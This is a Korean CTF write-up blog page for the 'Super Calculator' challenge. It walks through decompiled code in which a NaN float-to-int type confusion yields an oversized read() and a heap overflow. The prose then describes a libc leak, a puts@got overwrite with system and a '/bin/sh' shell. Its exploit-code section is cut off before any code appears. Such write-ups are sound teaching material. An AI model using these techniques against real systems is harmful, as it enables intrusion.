@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="http:&#x2F;&#x2F;hackingcamp.org&#x2F;  같은 Demon 팀의 수민님이 내신 문제다. 대회 전에 문제 검수하면서 스스로 풀어봤는데 이때까지 한 검수 중에서 세 손가락 안에 들 정도로 재밌는 문제여서 블로그에 꼭 기록하고 싶었다. 이 문제를 풀면서 디버깅을 굉장히 많이 하였다.. 미리 스포하자면 이 문제는 Chrome은 아니지만 Chrome 1-day와">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)">
+<meta property="og:url" content="https://jiravvit.github.io/230211-hcamp2023w-super_calculator/index.html">
+<meta property="og:site_name" content="jir4vvit">
+<meta property="og:description" content="http:&#x2F;&#x2F;hackingcamp.org&#x2F;  같은 Demon 팀의 수민님이 내신 문제다. 대회 전에 문제 검수하면서 스스로 풀어봤는데 이때까지 한 검수 중에서 세 손가락 안에 들 정도로 재밌는 문제여서 블로그에 꼭 기록하고 싶었다. 이 문제를 풀면서 디버깅을 굉장히 많이 하였다.. 미리 스포하자면 이 문제는 Chrome은 아니지만 Chrome 1-day와">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-02-10T23:00:00.000Z">
+<meta property="article:modified_time" content="2023-02-11T18:33:02.217Z">
+<meta property="article:author" content="jir4vvit">
+<meta property="article:tag" content="Hacking Camp">
+<meta property="article:tag" content="Type Confusion">
+<meta property="article:tag" content="1-day">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/judi2.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/judi2.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/judi2.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/230211-hcamp2023w-syscall/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/230207-dicectf2023-bop/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230211-hcamp2023w-super_calculator/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230211-hcamp2023w-super_calculator/&text=Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230211-hcamp2023w-super_calculator/&title=Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230211-hcamp2023w-super_calculator/&is_video=false&description=Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)&body=Check out this article: https://jiravvit.github.io/230211-hcamp2023w-super_calculator/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230211-hcamp2023w-super_calculator/&title=Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230211-hcamp2023w-super_calculator/&title=Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230211-hcamp2023w-super_calculator/&title=Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230211-hcamp2023w-super_calculator/&title=Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230211-hcamp2023w-super_calculator/&name=Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230211-hcamp2023w-super_calculator/&t=Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solve"><span class="toc-number">2.</span> <span class="toc-text">Solve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">2.2.</span> <span class="toc-text">Flag</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">jir4vvit</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-02-10T23:00:00.000Z" itemprop="datePublished">2023-02-11</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WriteUp/">WriteUp</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/1-day/" rel="tag">1-day</a>, <a class="tag-link-link" href="/tags/Hacking-Camp/" rel="tag">Hacking Camp</a>, <a class="tag-link-link" href="/tags/Type-Confusion/" rel="tag">Type Confusion</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <ul>
+<li><a target="_blank" rel="noopener" href="http://hackingcamp.org/">http://hackingcamp.org/</a></li>
+</ul>
+<p>같은 Demon 팀의 수민님이 내신 문제다. 대회 전에 문제 검수하면서 스스로 풀어봤는데 이때까지 한 검수 중에서 세 손가락 안에 들 정도로 재밌는 문제여서 블로그에 꼭 기록하고 싶었다. 이 문제를 풀면서 디버깅을 굉장히 많이 하였다.. 미리 스포하자면 이 문제는 Chrome은 아니지만 Chrome 1-day와 관련있는데 나중에 시간이 난다면.. 관련 내용을 블로그에 적어 공유할까 싶기도 한다. (안 할 수도 있다.)</p>
+<blockquote>
+<p>Hello my name is Calculator</p>
+</blockquote>
+<ul>
+<li>[ 1 solves &#x2F; 500 points]</li>
+</ul>
+<p>아래는 solve가 0일 때 나온 힌트이다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ref. 1day Vulnerbility : https://bugs.chromium.org/p/chromium/issues/detail?id=1315192 (type confusion lead to oob)</span><br><span class="line"></span><br><span class="line">Hint : Static_cast, C++, NaN, Infinity, Buffer Overflow</span><br></pre></td></tr></table></figure>
+
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>main 부터 살펴봤다. (분석하면서 call_num의 타입을 struct를 하나 새로 만들어서 지정해주었다.)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">v10 = <span class="number">0</span>;</span><br><span class="line">cal_num = <span class="built_in">malloc</span>(<span class="number">0x138</span>uLL);</span><br><span class="line">setup();</span><br><span class="line">v3 = cal_num;</span><br><span class="line">v3-&gt;_int32 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">v4 = cal_num;</span><br><span class="line">v4-&gt;_int33 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">v5 = cal_num;</span><br><span class="line">v5-&gt;_int34 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>); <span class="comment">//</span></span><br><span class="line">v6 = cal_num;</span><br><span class="line">v6-&gt;_float35 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">v7 = cal_num;</span><br><span class="line">v7-&gt;_float36 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">v8 = cal_num;</span><br><span class="line">v8-&gt;_float37 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>); <span class="comment">//</span></span><br></pre></td></tr></table></figure>
+
+<p><code>setup()</code> 함수는 안봐도 되는 함수다. 스포를 하자면 <code>*cal_num-&gt;_int34</code>와 <code>*cal_num-&gt;_float37</code>을 주시해야 한다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    Banner();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v10);</span><br><span class="line">    <span class="keyword">switch</span> ( v10 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        Interger_cal();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        Real_cal();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        overflow();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        Number_change();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        Print_number();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        Print_Note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[E]rror&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>기능이 6가지가 있으며 내가 적은 숫자에 따라 각 기능이 실행된다. 일단 취약점을 찾아야 하니까 취약점일 것 같은 것들 위주로 빠르게 살펴봤다. 처음에 하나하나씩 빠르게 열어보고 세 번째 기능 함수를 보고 다시 첫 번째와 두 번째 함수를 살펴봤다.</p>
+<p>세 번째 기능 함수는 <code>overflow</code> 날 것 같이 생겨서 보자마자 <code>overflow</code>로 함수 명을 바꾸어주었다. (ctf니까 여기서 overflow가 나야 뭔갈 할 수 있겠다고 생각했다.)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">overflow</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)cal_num-&gt;_int34 || *cal_num-&gt;_float37 != <span class="number">0.0</span> )</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, cal_num, *(<span class="type">unsigned</span> <span class="type">int</span> *)cal_num-&gt;_int34);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;[E]rror&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>Interger_cal()</code>함수에서는 취약점일 것처럼 생긴게 안보였다. 하나 특징이 있다면 한 수식을 사용자로부터 입력받고 그 수식에 대한 연산을 진행하는데 연산 결과가 <code>*cal_num-&gt;_int34</code>에 담긴다는 것이다. <code>int</code> 연산 결과가 <code>int</code> 타입의 변수에 담기고 음수 연산도 잘 예외처리가 되어있어서 일단 넘어갔다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">Real_cal</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s1; <span class="comment">// [rsp+7h] [rbp-9h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Real cal&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *cal_num-&gt;_float37 == <span class="number">0.0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%1f %c %1f&quot;</span>, cal_num-&gt;_float35, &amp;s1, cal_num-&gt;_float36);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, s2) )</span><br><span class="line">    <span class="comment">// ..</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, &amp;s2[<span class="number">2</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *cal_num-&gt;_float35 &lt; *cal_num-&gt;_float36 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[E]rror&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(_DWORD *)cal_num-&gt;_int34 = (<span class="type">int</span>)(<span class="type">float</span>)(*cal_num-&gt;_float35 - *cal_num-&gt;_float36); <span class="comment">// [*]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, &amp;s2[<span class="number">4</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *cal_num-&gt;_float35 &lt; *cal_num-&gt;_float36 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[E]rror&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *cal_num-&gt;_float37 = *cal_num-&gt;_float35 / *cal_num-&gt;_float36; <span class="comment">// [**]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// ..</span></span><br><span class="line">    &#125;</span><br><span class="line">    Print_Note();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Result : %f&quot;</span>, *cal_num-&gt;_float37);</span><br><span class="line">    Number_Check(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Result : %f\n&quot;</span>, *cal_num-&gt;_float37);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>[*]</code> 를 보자. 처음에 이 함수를 보고 저기서 무조건 타입 컨퓨젼이 날 것이라 생각했다. 왜냐면 float 연산 결과를 int에 담으면 매우매우 큰 수가 담기기 떄문이다. 하지만 내가 <code>scanf(&quot;%1f %c %1f&quot;, cal_num-&gt;_float35, &amp;s1, cal_num-&gt;_float36);</code> 이 구문을 잘못 이해하고 있었다. <code>%1f</code>의 이미는 정수형으로 한 자리만 입력받겠다는 것을 의미한다. 나는 소수점 한자리인 줄 알고 디버깅해보면서 의문이 너무나 많았다.</p>
+<p>참고로 <code>float</code> 연산을 한다는 것은 어셈블리를 보고 바로 파악할 수 있었다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400F0D                 mov     rax, cs:_ZL7cal_num._int ; cal_num</span><br><span class="line">.text:0000000000400F14                 mov     rax, [rax+110h]</span><br><span class="line">.text:0000000000400F1B                 cvttss2si rdx, xmm0</span><br><span class="line">.text:0000000000400F20                 mov     [rax], edx</span><br></pre></td></tr></table></figure>
+
+<p><code>cvttss2si</code> 와 같은 (나에게 상대적으로 덜 익숙한) 어셈블리 연산은 <code>float</code> 연산에서 사용하기 때문이다.</p>
+<p>그리고 <code>Number_change</code>라는 수상한 함수가 보여서 바로 확인했다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> *<span class="title function_">Number_change</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  LODWORD(cal_num-&gt;_float38) = *cal_num-&gt;_int34;</span><br><span class="line">  *cal_num-&gt;_int34 = *cal_num-&gt;_float37; <span class="comment">// [*]</span></span><br><span class="line">  *cal_num-&gt;_float37 = SLODWORD(cal_num-&gt;_float38); </span><br><span class="line">  result = *cal_num-&gt;_int34;</span><br><span class="line">  <span class="keyword">if</span> ( result &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = cal_num-&gt;_int34;</span><br><span class="line">    --*result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>대놓고 <code>float</code> 타입의 값을 <code>int</code> 타입의 변수로 옮겨준다. 여기서 <code>type confusion</code>이 발생할 가능성이 있다. 그러나.. <code>float</code> 연산을 하던 <code>Real_cal</code> 함수에서는 정수 한자리로 계산하기 때문에 무의미하다고 생각했다. 여기서 오랜 시간 고민을 하다가 예전에 <code>Chrome 1-day</code> 분석했던 것이 떠올랐다. 정확히 뭔지는 기억 안나는데 연산 결과가 <code>NaN</code>이 나와서 <code>OOB</code>가 발생하는 취약점이 있었다. <code>NaN</code>은 <code>0/0</code>같은 것을 하면 나온다. <code>Not a Number</code>라는 뜻이다. </p>
+<p>아무튼 바로 아래 로직으로 테스트를 진행했고 <code>overflow</code>를 트리거 할 수 있었다.</p>
+<ol>
+<li><code>Real_Cal</code>에서 <code>0/0</code> 입력</li>
+<li><code>Number_Change</code> 함수 -&gt; 여기서 float의 <code>NaN</code>이 int로 넘어가는데 0보다 작기 때문에 문제 로직에 따라 -1을 함</li>
+<li><code>overflow</code> 함수를 통해 <code>overflow</code> 발생 -&gt; -1은 <code>read</code> 세 번째 인자로 들어가면서 <code>unsigned int</code>로 형변환되기 때문에 매우 큰 수가 되어 <code>overflow</code>가 발생한다.</li>
+</ol>
+<p>해당 과정은 디버깅을 하면서 이해하였다.</p>
+<h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>취약점 트리거도 꽤 고생을 했는데 익스할 때도 고생을 조금 했다. <code>OOB</code>가 발생하는데 leak도 해야하고 어떠한 함수의 got를 system 함수로 덮어야하고 어딘가에 ‘&#x2F;bin&#x2F;sh\x00’ 써야하는데 어디에 쓰지.. 란 생각이 동시에 들어서 혼란스러웠다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Print_number</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Print Number&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Num 1. %d\n&quot;</span>, *cal_num-&gt;_int32);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Num 2. %d\n&quot;</span>, *cal_num-&gt;_int33);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Result %d\n&quot;</span>, *cal_num-&gt;_int34);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Float Num 1. %f\n&quot;</span>, *cal_num-&gt;_float35);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Float Num 2. %f\n&quot;</span>, *cal_num-&gt;_float36);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Float Result %f\n&quot;</span>, *cal_num-&gt;_float37);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>하지만 main의 6가지 기능 중에 이런 것이 있었고, 나는 현재 <code>cal_num</code>에 overflow를 발생시켜 입력을 할 수 있으니 위에 보이는 저 값 즉, <code>*cal_num-&gt;_int32</code>나 <code>*cal_num-&gt;_int33</code>와 같은 값들을 덮을 수 있다. 이 기능을 이용하여 libc leak을 할 수 있다. 주의해야할 점은 이게 int라서 4바이트씩 끊어져서 leak이 된다. 하위 4바이트 출력값이 때로 음수가 될 때도 있어서 0보다 이상일 때만 걸러주었다. 아니면 그냥 예외를 강제로 발생시켜 다시 연결하였다. </p>
+<p>이런식으로 <code>libc base</code>를 정상적으로 구할 수 있고 이제 <code>어떠한 함수</code>를 <code>system</code> 함수로 덮어야 한다. </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Print_Note</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(cal_num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>기능 중에 이런 기능이 있었고, <code>puts</code> 함수를 <code>system</code> 함수로 덮고 <code>cal_num</code>이 우리 입력값이니까 ‘&#x2F;bin&#x2F;sh\x00’을 쉽게 넣어 쉘을 따자고 생각했다. 재밌게도 이 함수는 <code>Interger_cal</code> 함수가 종료될 떄 쯤 호출이 된다. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*cal_num-&gt;_int34 = *cal_num-&gt;_int32 + *cal_num-&gt;_int33;</span><br></pre></td></tr></table></figure>
+
+<p><code>Interger_cal</code> 함수 상단에선 사용자 입력에 따라 이러한 연산을 수행한다. 이걸 이용하여 <code>puts@got</code>를 <code>system</code> 함수로 덮을 수 있겠다고 생각했다. 먼저 <code>overflow</code> 함수에서 피 연산자 두 개에 <code>puts@got</code>를 4바이트씩 잘라서 넣어놓고 <code>Interger_cal</code> 함수에서 <code>puts@got</code>에다가 값을 쓸 수 있다. 이 때 중요한 것은 4바이트씩 잘 잘라서 넣어줘야한다는 것이다. 그럼 이제 쉘을 획득할 수 있다.</p>
+<h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 